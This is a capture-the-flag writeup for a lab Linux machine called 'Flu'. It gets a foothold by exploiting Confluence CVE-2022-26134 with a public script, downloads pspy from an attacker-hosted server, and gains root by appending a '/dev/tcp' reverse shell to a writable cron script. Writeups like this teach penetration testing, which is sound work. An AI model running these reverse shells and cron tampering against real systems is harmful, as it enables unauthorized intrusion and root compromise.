---
title: "Flu - Writeup"
linkTitle: "Flu"
weight: 14
featured: true
platform: "PG"
name: "Flu"
os: "Linux"
difficulty: "Medium"
release: "15 Jul 2026"
ip: "192.168.200.41"
# Drop a real avatar at static/img/pg/flu.png and uncomment:
# avatar: "/img/pg/flu.png"
tags: ["linux", "confluence", "cve-2022-26134", "ognl-injection", "pspy", "cron-privesc", "root-shell"]
description: "Medium Linux box. Confluence's OGNL injection RCE gives a foothold, and pspy exposes a root cron job backing up logs through a writable script."
---

{{< htb name="Flu" os="Linux" difficulty="Medium" release="15 Jul 2026" ip="192.168.200.41" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 192.168.200.41
```

```
Open 192.168.200.41:22
Open 192.168.200.41:8090
Open 192.168.200.41:8091
```

```
(root㉿kali)# nmap 192.168.200.41 -p8090,8091 -sCV
```

```
8090/tcp open  http     Apache Tomcat (language: en)
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action
8091/tcp open  jamlink?
|   Server: Aleph/0.4.6
```

8090 identifies itself clearly as **Confluence**. 8091 answers with an unfamiliar `Aleph/0.4.6` banner nmap can't classify, worth noting but not a lead worth chasing when the other port names itself outright.

## Enumeration

Confluence has a well-known unauthenticated OGNL injection RCE, [CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire), affecting a wide range of Confluence Server and Data Center versions.

## Initial Foothold

```
(root㉿kali)# python through_the_wire.py --rhost 192.168.200.41 --rport 8090 --lhost 192.168.45.165 --protocol http:// --reverse-shell
```

```
[+] Forking a netcat listener
[+] Sending expoit at http://192.168.200.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.200.41] 32874
```

```
confluence@flu:/opt/atlassian/confluence/bin$
```

## Privilege Escalation

```
(root㉿kali)# python -m http.server 80
```

```
confluence@flu:/tmp$ curl http://192.168.45.165/pspy64 -o /tmp/pspy64
confluence@flu:/tmp$ chmod +x pspy64
confluence@flu:/tmp$ ./pspy64
```

```
2026/07/15 19:00:01 CMD: UID=0  PID=4670  | /bin/bash /opt/log-backup.sh
2026/07/15 19:00:01 CMD: UID=0  PID=4671  | cp -r /opt/atlassian/confluence//logs /root/backup/log_backup_20260715190001
2026/07/15 19:00:01 CMD: UID=0  PID=4673  | /bin/sh -c gzip
```

A cron job runs `/opt/log-backup.sh` as root on a schedule.

```
confluence@flu:/tmp$ cat /opt/log-backup.sh
```

```bash
#!/bin/bash
CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP
tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP
find $BACKUP_DIR -name "log_backup_*" -mmin +5 -exec rm -rf {} \;
```

The `confluence` user can write to this file. Append a reverse shell, then wait for the next cron cycle to run it as root.

```
confluence@flu:/tmp$ echo "sh -i >& /dev/tcp/192.168.45.165/22 0>&1" >> /opt/log-backup.sh
```

```
(root㉿kali)# nc -lnvp 22
```

```
connect to [192.168.45.165] from (UNKNOWN) [192.168.200.41] 58366
sh: 0: can't access tty; job control turned off
#
```

```
# cd /root
# cat proof.txt
```

```
aeb53f0747a2535ab01b81d7380e6d28
```

## Lessons learned

- An unidentified port doesn't need to be forced into a category. Nmap couldn't classify 8091, and that was fine, the other open port already named its exact product, chase the confirmed lead first.
- Run `pspy` immediately once any low-priv shell lands. A root cron job here was completely invisible any other way, and the script it ran was the entire privilege escalation.
- A backup or maintenance script feels routine, but if it runs as root on a schedule and the current user can write to it, that's a direct path in, always check both facts together, not just that the script exists.
